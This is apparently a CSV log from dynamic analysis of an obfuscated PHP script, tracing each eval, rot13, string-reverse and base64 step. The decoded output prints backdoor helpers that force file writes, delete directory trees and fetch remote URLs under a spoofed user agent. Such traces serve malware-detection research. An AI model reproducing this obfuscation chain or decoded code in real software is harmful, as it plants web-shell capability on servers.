uuid,file_md5,index,source,target,argc,argv,return,dynamic
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,669,eval,hiabug,2,"{""value"": [[0, ""QtrIng"", ""==DsX0jB5I2nxNvolIUqyWKPX0jBcHTox5JLbEPXyA3ofAzMNytPA0KPX0jByAUouMTV6NFM1WUqt8QVcDUryEUWfHTox5JLbEPXyEKnlqaMNOFCtxKMeEFPWbDQ7xvA2L""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,670,hiabug,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,671,hiabug,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,672,hiabug,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,673,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,674,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,675,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,676,hiabug,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,677,hiabug,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,678,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,679,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,680,hiabug,strrev,1,"{""value"": [[0, ""str"", ""==DsX0jB5I2nxNvolIUqyWKPX0jBcHTox5JLbEPXyA3ofAzMNytPA0KPX0jByAUouMTV6NFM1WUqt8QVcDUryEUWfHTox5JLbEPXyEKnlqaMNOFCtxKMeEFPWbDQ7xvA2L""]]}",{"value": "MaIhL3Eco24tMT9sq3WcqTHbWTMcoTHfWUDfWUEyrUDcQDc7QDbWWTgyrFN9VUElqJH7QDbWWTuuozEfMFN9VROzo3OyovtxMzyfMFjxqPx7QDbWnJLbVHOzq3WcqTHbWT"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,681,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tMT9sq3WcqTHbWTMcoTHfWUDfWUEyrUDcQDc7QDbWWTgyrFN9VUElqJH7QDbWWTuuozEfMFN9VROzo3OyovtxMzyfMFjxqPx7QDbWnJLbVHOzq3WcqTHbWT""]]}",{"value": "ZnVuY3Rpb24gZG9fd3JpdGUoJGZpbGUsJHQsJHRleHQpDQp7DQoJJGtleSA9IHRydWU7DQoJJGhhbmRsZSA9IEBmb3BlbigkZmlsZSwkdCk7DQoJaWYoIUBmd3JpdGUoJG"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,682,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gZG9fd3JpdGUoJGZpbGUsJHQsJHRleHQpDQp7DQoJJGtleSA9IHRydWU7DQoJJGhhbmRsZSA9IEBmb3BlbigkZmlsZSwkdCk7DQoJaWYoIUBmd3JpdGUoJG""]]}","{""value"": ""function do_write($file,$t,$text)\r\n{\r\n\t$key = true;\r\n\t$handle = @fopen($file,$t);\r\n\tif(!@fwrite($handle,$text))\r\n\t{\r\n\t\t@chmod($fil""}",[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,683,hiabug,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function do_write($file,$t,$text)\r\n{\r\n\t$key = true;\r\n\t$handle = @fopen($file,$t);\r\n\tif(!@fwrite($handle,$text))\r\n\t{\r\n\t\t@chmod($fil""]]}",{"value": "\\x00lambda_28"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,684,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function do_write($file,$t,$text)\r\n{\r\n\t$key = true;\r\n\t$handle = @fopen($file,$t);\r\n\tif(!@fwrite($handle,$text))\r\n\t{\r\n\t\t@chmod($file,0666);\r\n\t\t$key = @fwrite($handle,$text) ? true : false;\r\n\t}\r\n\t@fclose($handle);\r\n\treturn $key;\r\n}}""]]}",{"value": "003E"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,685,hiabug,__lambda_func,0,{"value": []},{"value": "void"},[]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,686,eval,hiabug,2,"{""value"": [[0, ""QtrIng"", ""=0aPAfmqiu2pxNvolIUqyWKPX0jBctFMm9Tow5GYlyTMxxtPA0KPX0jBmITocMTWt0QVqg1qiu2pxxDPX0jBcHTocMTWhplYa4Pn0STpykJnzEPXbEKLj9yp0AUV9Nlpyk""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,687,hiabug,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,688,hiabug,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,689,hiabug,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,690,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,691,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,692,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,693,hiabug,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,694,hiabug,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,695,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,696,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,697,hiabug,strrev,1,"{""value"": [[0, ""str"", ""=0aPAfmqiu2pxNvolIUqyWKPX0jBctFMm9Tow5GYlyTMxxtPA0KPX0jBmITocMTWt0QVqg1qiu2pxxDPX0jBcHTocMTWhplYa4Pn0STpykJnzEPXbEKLj9yp0AUV9Nlpyk""]]}",{"value": "MaIhL3Eco24tMT9sp2uiqltxMzyfMKOuqTtcrj0XPFEmnT93VQ0tLKWlLKxbXGfAPtxxMTylVQ0tMTylXPEznJkypTS0nPx7QDbWq2ucoTHbWTMcoTHtCFNxMTylYG5lMJ"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,698,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tMT9sp2uiqltxMzyfMKOuqTtcrj0XPFEmnT93VQ0tLKWlLKxbXGfAPtxxMTylVQ0tMTylXPEznJkypTS0nPx7QDbWq2ucoTHbWTMcoTHtCFNxMTylYG5lMJ""]]}",{"value": "ZnVuY3Rpb24gZG9fc2hvdygkZmlsZXBhdGgpew0KCSRzaG93ID0gYXJyYXkoKTsNCgkkZGlyID0gZGlyKCRmaWxlcGF0aCk7DQoJd2hpbGUoJGZpbGUgPSAkZGlyLT5yZW"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,699,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gZG9fc2hvdygkZmlsZXBhdGgpew0KCSRzaG93ID0gYXJyYXkoKTsNCgkkZGlyID0gZGlyKCRmaWxlcGF0aCk7DQoJd2hpbGUoJGZpbGUgPSAkZGlyLT5yZW""]]}",{"value": "function do_show($filepath){\r\n\t$show = array();\r\n\t$dir = dir($filepath);\r\n\twhile($file = $dir->read()){\r\n\t\tif($file == '.' or $fil"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,700,hiabug,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function do_show($filepath){\r\n\t$show = array();\r\n\t$dir = dir($filepath);\r\n\twhile($file = $dir->read()){\r\n\t\tif($file == '.' or $fil""]]}",{"value": "\\x00lambda_29"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,701,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function do_show($filepath){\r\n\t$show = array();\r\n\t$dir = dir($filepath);\r\n\twhile($file = $dir->read()){\r\n\t\tif($file == '.' or $file == '..') continue;\r\n\t\t$files = str_path($filepath.'/'.$file);\r\n\t\t$show[] = $files;\r\n\t}\r\n\t$dir->close();\r\n\treturn $show;\r\n}}""]]}",{"value": "003E"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,702,hiabug,__lambda_func,0,{"value": []},{"value": "void"},[]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,703,eval,hiabug,2,"{""value"": [[0, ""QtrIng"", ""==DsX0jByIap0OvolIUqyWKPX0jByAUouMTVhWKq0IzptxFXlyTMfITMxtvpcEJolOHVbLJnWbDQ7xlA3pQZfVKnxkJMxEPXx9JobATDWbDQ9ytPA0KPWbDQ7H2pfSzMt4""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,704,hiabug,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,705,hiabug,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,706,hiabug,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,707,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,708,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,709,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,710,hiabug,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,711,hiabug,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,712,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,713,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,714,hiabug,strrev,1,"{""value"": [[0, ""str"", ""==DsX0jByIap0OvolIUqyWKPX0jByAUouMTVhWKq0IzptxFXlyTMfITMxtvpcEJolOHVbLJnWbDQ7xlA3pQZfVKnxkJMxEPXx9JobATDWbDQ9ytPA0KPWbDQ7H2pfSzMt4""]]}",{"value": "MaIhL3Eco24tMT9sMTIfqUWyMFtxMTIfMTylXKfAPtxxp2uiq2McoTHtCFOxo19mnT93XPExMJkxnKVcBj0XPJMipzIuL2tbWUAbo3qznJkyVTSmVPExMJjcrj0XPDycMv"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,715,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tMT9sMTIfqUWyMFtxMTIfMTylXKfAPtxxp2uiq2McoTHtCFOxo19mnT93XPExMJkxnKVcBj0XPJMipzIuL2tbWUAbo3qznJkyVTSmVPExMJjcrj0XPDycMv""]]}",{"value": "ZnVuY3Rpb24gZG9fZGVsdHJlZSgkZGVsZGlyKXsNCgkkc2hvd2ZpbGUgPSBkb19zaG93KCRkZWxkaXIpOw0KCWZvcmVhY2goJHNob3dmaWxlIGFzICRkZWwpew0KCQlpZi"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,716,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gZG9fZGVsdHJlZSgkZGVsZGlyKXsNCgkkc2hvd2ZpbGUgPSBkb19zaG93KCRkZWxkaXIpOw0KCWZvcmVhY2goJHNob3dmaWxlIGFzICRkZWwpew0KCQlpZi""]]}",{"value": "function do_deltree($deldir){\r\n\t$showfile = do_show($deldir);\r\n\tforeach($showfile as $del){\r\n\t\tif(is_dir($del)){ \r\n\t\t\tif(!do_deltr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,717,hiabug,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function do_deltree($deldir){\r\n\t$showfile = do_show($deldir);\r\n\tforeach($showfile as $del){\r\n\t\tif(is_dir($del)){ \r\n\t\t\tif(!do_deltr""]]}",{"value": "\\x00lambda_30"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,718,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function do_deltree($deldir){\r\n\t$showfile = do_show($deldir);\r\n\tforeach($showfile as $del){\r\n\t\tif(is_dir($del)){ \r\n\t\t\tif(!do_deltree($del)) return false;\r\n\t\t}elseif(!is_dir($del)){\r\n\t\t\t@chmod($del,0777);\r\n\t\t\tif(!@unlink($del)) return false;\r\n\t\t}\r\n\t}\r\n\t@chmod($deldir,0777);\r\n\tif(!@rmdir($deldir)) return false;\r\n\treturn true;\r\n}}""]]}",{"value": "003E"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,719,hiabug,__lambda_func,0,{"value": []},{"value": "void"},[]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,720,eval,hiabug,2,"{""value"": [[0, ""QtrIng"", ""==DstbDQ9yDPX0jBwEPVhWKq0IzptNPVtNPVtNvPAfKPWbDQcxlLxtFr0OKoySPXzyJPWbDQ9OPVtNPVtNPVX0jBvfGXa4mWpyvVpkzp1EvVpuPolIaBF90HFI1DajICyk""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,721,hiabug,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,722,hiabug,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,723,hiabug,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,724,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,725,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,726,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,727,hiabug,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,728,hiabug,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,729,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,730,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,731,hiabug,strrev,1,"{""value"": [[0, ""str"", ""==DstbDQ9yDPX0jBwEPVhWKq0IzptNPVtNPVtNvPAfKPWbDQcxlLxtFr0OKoySPXzyJPWbDQ9OPVtNPVtNPVX0jBvfGXa4mWpyvVpkzp1EvVpuPolIaBF90HFI1DajICyk""]]}",{"value": "MaIhL3Eco24tE2I0FUEgoPtxqKWfXD0Xrj0XVPNtVPNtWTZtCFNaWmfAPvNtVPNtVPE1p2IlLJqyoaDtCFNaGJ96nJkfLF80YwNtXTAioKOuqTyvoTH7VR1GFHHtAv4jBl"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,732,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tE2I0FUEgoPtxqKWfXD0Xrj0XVPNtVPNtWTZtCFNaWmfAPvNtVPNtVPE1p2IlLJqyoaDtCFNaGJ96nJkfLF80YwNtXTAioKOuqTyvoTH7VR1GFHHtAv4jBl""]]}",{"value": "ZnVuY3Rpb24gR2V0SHRtbCgkdXJsKQ0Kew0KICAgICAgJGMgPSAnJzsNCiAgICAgICR1c2VyYWdlbnQgPSAnTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNi4wOy"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,733,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gR2V0SHRtbCgkdXJsKQ0Kew0KICAgICAgJGMgPSAnJzsNCiAgICAgICR1c2VyYWdlbnQgPSAnTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNi4wOy""]]}",{"value": "function GetHtml($url)\r\n{\r\n      $c = '';\r\n      $useragent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)';\r\n      if(func"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,734,hiabug,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function GetHtml($url)\r\n{\r\n      $c = '';\r\n      $useragent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)';\r\n      if(func""]]}",{"value": "\\x00lambda_31"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,735,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function GetHtml($url)\r\n{\r\n      $c = '';\r\n      $useragent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)';\r\n      if(function_exists('fsockopen')){\r\n    \t$link = parse_url($url);\r\n\t    $query=$link['path'].'?'.$link['query'];\r\n\t    $host=strtolower($link['host']);\r\n\t    $port=$link['port'];\r\n\t    if($port==\""\""){$port=80;}\r\n\t    $fp = fsockopen ($host,$port, $errno, $errstr, 10);\r\n\t    if ($fp)\r\n\t      {\r\n\t\t    $out = \""GET /{$query} HTTP/1.0\\r\\n\""; \r\n\t\t    $out .= \""Host: {$host}\\r\\n\""; \r\n\t\t    $out .= \""User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)\\r\\n\""; \r\n\t\t    $out .= \""Connection: Close\\r\\n\\r\\n\""; \r\n\t\t    fwrite($fp, $out);\r\n\t\t    $inheader=1;\r\n\t\t    while(!feof($fp)) \r\n\t\t         {$line=fgets($fp,4096);\t\r\n\t\t\t      if($inheader==0){$contents.=$line;}\r\n\t\t\t      if ($inheader &&($line==\""\\n\""||$line==\""\\r\\n\"")){$inheader = 0;}\r\n\t\t    } \r\n\t\t    fclose ($fp); \r\n\t\t    $c= $contents;\r\n\t      }\r\n        }\r\n\t\tif(empty($c) && function_exists('curl_init') && function_exists('curl_exec')){\r\n            $ch = curl_init();\r\n            curl_setopt($ch, CURLOPT_URL, $url);\r\n            curl_setopt($ch, CURLOPT_TIMEOUT, 15);\r\n            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);\r\n            curl_setopt($ch, CURLOPT_USERAGENT, $useragent);\r\n            $c = curl_exec($ch);\r\n            curl_close($ch);\r\n        }\r\n        if(empty($c) && ini_get('allow_url_fopen')){\r\n            $c = implode('',@file($url));\r\n        }\r\n\t\tif(empty($c)){\r\n            echo \""document.write('<DIV style=\\'CURSOR:url(\\\""$url\\\"")\\'>');\"";\r\n        }\r\n\t\tif(!empty($c))\r\n\t\t{\r\n        return $c;\r\n\t\t}\r\n }}""]]}",{"value": "003E"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,736,hiabug,__lambda_func,0,{"value": []},{"value": "void"},[]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,737,eval,hiabug,2,"{""value"": [[0, ""QtrIng"", ""==DsX0jBcxvVQOIBj00F1OQGYqIrZqRA9VPXyE2oQ1zFb42Kf1TqbytPA0KPX0DsWxtPAfGXc0Inxf1qiWUWbZapuu2LfSJnwITpmkJo0uTXh9SogEUnWxDPX0jrcflXcE""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,738,hiabug,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,739,hiabug,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,740,hiabug,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,741,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,742,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,743,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,744,hiabug,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
